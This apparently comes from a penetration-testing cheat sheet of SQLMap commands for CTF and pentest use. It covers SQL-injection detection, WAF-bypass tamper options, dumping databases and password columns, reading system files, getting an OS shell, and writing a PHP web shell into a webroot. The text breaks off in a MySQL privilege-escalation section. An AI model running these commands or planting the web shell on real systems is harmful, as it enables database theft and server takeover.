{"title": "SQLMap", "source": "enum", "source_label": "Enumeration", "path": "sqlmap", "html": "<h1 id=\"sqlmap\">SQLMap</h1>\n<h2 id=\"basic-detection\">Basic Detection</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Basic GET parameter test</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span>\n\n<span class=\"c1\"># Specific parameter</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&amp;page=2&quot;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span>id\n\n<span class=\"c1\"># POST request</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--data<span class=\"w\"> </span><span class=\"s2\">&quot;id=1&amp;submit=Submit&quot;</span>\n\n<span class=\"c1\"># Test all parameters</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&amp;user=test&quot;</span><span class=\"w\"> </span>--level<span class=\"w\"> </span><span class=\"m\">2</span>\n\n<span class=\"c1\"># Batch mode (auto-answer all prompts)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Verbose output</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>-v<span class=\"w\"> </span><span class=\"m\">3</span>\n\n<span class=\"c1\"># Force DBMS (skip detection)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mysql\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>postgresql\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>sqlite\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>oracle\n</code></pre></div>\n<h2 id=\"risk-level-flags\">Risk &amp; Level Flags</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Level (1-5, default 1): number of tests per parameter</span>\n<span class=\"c1\"># Risk (1-3, default 1): risk of tests (3 = potentially destructive)</span>\n\n<span class=\"c1\"># Standard CTF/pentest</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--level<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">2</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Full aggression</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--level<span class=\"o\">=</span><span class=\"m\">5</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Conservative (avoid breaks)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--level<span class=\"o\">=</span><span class=\"m\">1</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">1</span>\n\n<span class=\"c1\"># Level/risk with specific DBMS</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mysql<span class=\"w\"> </span>--level<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">2</span><span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"get-post-parameter-testing\">GET / POST Parameter Testing</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># GET parameter</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span>id<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># POST data (form)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--data<span class=\"o\">=</span><span class=\"s2\">&quot;username=admin&amp;password=test&quot;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span>username<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># POST data with method</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--method<span class=\"w\"> </span>POST<span class=\"w\"> </span>--data<span class=\"o\">=</span><span class=\"s2\">&quot;id=1&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># JSON POST body</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--data<span class=\"o\">=</span><span class=\"s1\">&#39;{&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;}&#39;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-H<span class=\"w\"> </span><span class=\"s2\">&quot;Content-Type: application/json&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># XML POST body</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--data<span class=\"o\">=</span><span class=\"s1\">&#39;&lt;id&gt;1&lt;/id&gt;&#39;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-H<span class=\"w\"> </span><span class=\"s2\">&quot;Content-Type: application/xml&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Multipart form data</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--form<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># PUT request</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;/api/users/1<span class=\"w\"> </span>--method<span class=\"w\"> </span>PUT<span class=\"w\"> </span>--data<span class=\"o\">=</span><span class=\"s1\">&#39;{&quot;name&quot;:&quot;test&quot;}&#39;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-H<span class=\"w\"> </span><span class=\"s2\">&quot;Content-Type: application/json&quot;</span><span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"crawling\">Crawling</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Crawl the site and test all forms/params</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--crawl<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Crawl with depth</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--crawl<span class=\"o\">=</span><span class=\"m\">5</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Crawl + exclude specific paths</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--crawl<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--exclude-regexp<span class=\"o\">=</span><span class=\"s2\">&quot;logout|signout&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Crawl with forms</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--crawl<span class=\"o\">=</span><span class=\"m\">2</span><span class=\"w\"> </span>--forms<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Crawl scope (restrict to domain)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--crawl<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--scope<span class=\"o\">=</span><span class=\"s2\">&quot;&lt;domain&gt;&quot;</span><span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"authentication-cookies\">Authentication — Cookies</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Session cookie</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--cookie<span class=\"o\">=</span><span class=\"s2\">&quot;session=abc123&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Test the cookie parameter itself</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--cookie<span class=\"o\">=</span><span class=\"s2\">&quot;id=1; session=abc123&quot;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span>id<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Multiple cookies</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?page=1&quot;</span><span class=\"w\"> </span>--cookie<span class=\"o\">=</span><span class=\"s2\">&quot;auth=xyz; PHPSESSID=abc123&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Cookie from file</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--load-cookies<span class=\"w\"> </span>cookies.txt<span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"authentication-forms-http-auth\">Authentication — Forms / HTTP Auth</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Form-based login (let sqlmap handle login)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;url&gt;<span class=\"w\"> </span>--data<span class=\"o\">=</span><span class=\"s2\">&quot;user=&lt;username&gt;&amp;pass=&lt;password&gt;&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--forms<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># HTTP Basic auth</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--auth-type<span class=\"o\">=</span>basic<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--auth-cred<span class=\"o\">=</span><span class=\"s2\">&quot;&lt;username&gt;:&lt;password&gt;&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># HTTP Digest auth</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--auth-type<span class=\"o\">=</span>digest<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--auth-cred<span class=\"o\">=</span><span class=\"s2\">&quot;&lt;username&gt;:&lt;password&gt;&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># NTLM auth</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--auth-type<span class=\"o\">=</span>ntlm<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--auth-cred<span class=\"o\">=</span><span class=\"s2\">&quot;&lt;domain&gt;\\\\&lt;username&gt;:&lt;password&gt;&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Bearer token</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-H<span class=\"w\"> </span><span class=\"s2\">&quot;Authorization: Bearer &lt;password&gt;&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># API key</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-H<span class=\"w\"> </span><span class=\"s2\">&quot;X-Api-Key: &lt;password&gt;&quot;</span><span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"database-enumeration\">Database Enumeration</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># List databases</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbs<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Current database</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--current-db<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Current user</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--current-user<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Check if DBA</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--is-dba<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># List tables in database</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>-D<span class=\"w\"> </span>&lt;database&gt;<span class=\"w\"> </span>--tables<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># List columns in table</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>-D<span class=\"w\"> </span>&lt;database&gt;<span class=\"w\"> </span>-T<span class=\"w\"> </span>&lt;table&gt;<span class=\"w\"> </span>--columns<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Dump table data</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>-D<span class=\"w\"> </span>&lt;database&gt;<span class=\"w\"> </span>-T<span class=\"w\"> </span>&lt;table&gt;<span class=\"w\"> </span>--dump<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Dump specific columns</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>-D<span class=\"w\"> </span>&lt;database&gt;<span class=\"w\"> </span>-T<span class=\"w\"> </span>&lt;table&gt;<span class=\"w\"> </span>-C<span class=\"w\"> </span>&lt;username&gt;,&lt;password&gt;<span class=\"w\"> </span>--dump<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Dump all databases</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dump-all<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Search for specific column name</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--search<span class=\"w\"> </span>-C<span class=\"w\"> </span>password<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Search table name</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--search<span class=\"w\"> </span>-T<span class=\"w\"> </span>users<span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"blind-injection-techniques\">Blind Injection Techniques</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Boolean-based blind</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>B<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Time-based blind</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>T<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Error-based</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>E<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Union-based</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>U<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Stacked queries</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>S<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># All techniques</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>BEUSTQ<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Time-based: increase sleep time</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--technique<span class=\"o\">=</span>T<span class=\"w\"> </span>--time-sec<span class=\"o\">=</span><span class=\"m\">5</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Increase timeout for slow targets</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--timeout<span class=\"o\">=</span><span class=\"m\">30</span><span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"tamper-scripts\">Tamper Scripts</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># List available tampers</span>\nsqlmap<span class=\"w\"> </span>--list-tampers\n\n<span class=\"c1\"># Bypass basic WAF</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--tamper<span class=\"o\">=</span>space2comment<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># URL encode everything</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--tamper<span class=\"o\">=</span>charencode<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Double URL encode</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--tamper<span class=\"o\">=</span>chardoubleencode<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Hex encode strings</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--tamper<span class=\"o\">=</span>hex2char<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MySQL specific WAF bypass</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--tamper<span class=\"o\">=</span>space2mysqldash,charencode<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MSSQL specific</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql<span class=\"w\"> </span>--tamper<span class=\"o\">=</span>space2comment,charencode<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Common WAF bypass combo</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--tamper<span class=\"o\">=</span>space2comment,charencode,randomcase<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--level<span class=\"o\">=</span><span class=\"m\">3</span><span class=\"w\"> </span>--risk<span class=\"o\">=</span><span class=\"m\">2</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Modsecurity bypass</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--tamper<span class=\"o\">=</span>between,charencode,space2comment<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--batch\n\n<span class=\"c1\"># Multiple tampers</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--tamper<span class=\"o\">=</span>apostrophemask,apostrophenullencode,charencode<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--batch\n</code></pre></div>\n<h2 id=\"os-shell-command-execution\">OS Shell &amp; Command Execution</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Attempt to get OS shell (requires stacked queries or into outfile)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--os-shell<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># OS command execution</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--os-cmd<span class=\"o\">=</span><span class=\"s2\">&quot;whoami&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Windows command</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--os-cmd<span class=\"o\">=</span><span class=\"s2\">&quot;ipconfig&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mssql<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Upload a web shell (requires write permission to webroot)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--os-shell<span class=\"w\"> </span>--web-root<span class=\"o\">=</span>/var/www/html<span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"file-read-write\">File Read / Write</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Read a file (must have FILE privilege)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--file-read<span class=\"o\">=</span><span class=\"s2\">&quot;/etc/passwd&quot;</span><span class=\"w\"> </span>--batch\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--file-read<span class=\"o\">=</span><span class=\"s2\">&quot;C:/Windows/win.ini&quot;</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Write a file (must have write privilege + INTO OUTFILE support)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--file-write<span class=\"o\">=</span>shell.php<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--file-dest<span class=\"o\">=</span>/var/www/html/shell.php<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--batch\n\n<span class=\"c1\"># Write webshell</span>\n<span class=\"nb\">echo</span><span class=\"w\"> </span><span class=\"s1\">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class=\"w\"> </span>&gt;<span class=\"w\"> </span>/tmp/shell.php\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--file-write<span class=\"o\">=</span>/tmp/shell.php<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--file-dest<span class=\"o\">=</span>/var/www/html/cmd.php<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>--batch\n</code></pre></div>\n<h2 id=\"proxy-output\">Proxy &amp; Output</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># Route through Burp</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--proxy<span class=\"o\">=</span>http://127.0.0.1:8080<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># SOCKS5 proxy</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--proxy<span class=\"o\">=</span>socks5://127.0.0.1:1080<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Save output to directory</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--output-dir<span class=\"o\">=</span>/tmp/sqlmap_&lt;target&gt;<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Dump CSV format</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>-D<span class=\"w\"> </span>&lt;database&gt;<span class=\"w\"> </span>-T<span class=\"w\"> </span>&lt;table&gt;<span class=\"w\"> </span>--dump<span class=\"w\"> </span>--batch<span class=\"w\"> </span>--csv-del<span class=\"o\">=</span><span class=\"s2\">&quot;,&quot;</span>\n\n<span class=\"c1\"># Use request file (from Burp)</span>\nsqlmap<span class=\"w\"> </span>-r<span class=\"w\"> </span>request.txt<span class=\"w\"> </span>--batch\nsqlmap<span class=\"w\"> </span>-r<span class=\"w\"> </span>request.txt<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;parameter&gt;<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Threads (parallel requests)</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--threads<span class=\"o\">=</span><span class=\"m\">5</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Delay between requests</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--delay<span class=\"o\">=</span><span class=\"m\">1</span><span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Random user-agent</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--random-agent<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># Mobile user-agent</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--mobile<span class=\"w\"> </span>--batch\n</code></pre></div>\n<h2 id=\"dbms-specific-attacks\">DBMS-Specific Attacks</h2>\n<h3 id=\"mysql\">MySQL</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c1\"># MySQL full recon</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;url&gt;?id=1&quot;</span><span class=\"w\"> </span>--dbms<span class=\"o\">=</span>mysql<span class=\"w\"> </span>--dbs<span class=\"w\"> </span>--current-user<span class=\"w\"> </span>--is-dba<span class=\"w\"> </span>--batch\n\n<span class=\"c1\"># MySQL UDF privilege escalation</span>\nsqlmap<span class=\"w\"> </span>-u<span class=\"w\"> </span><span 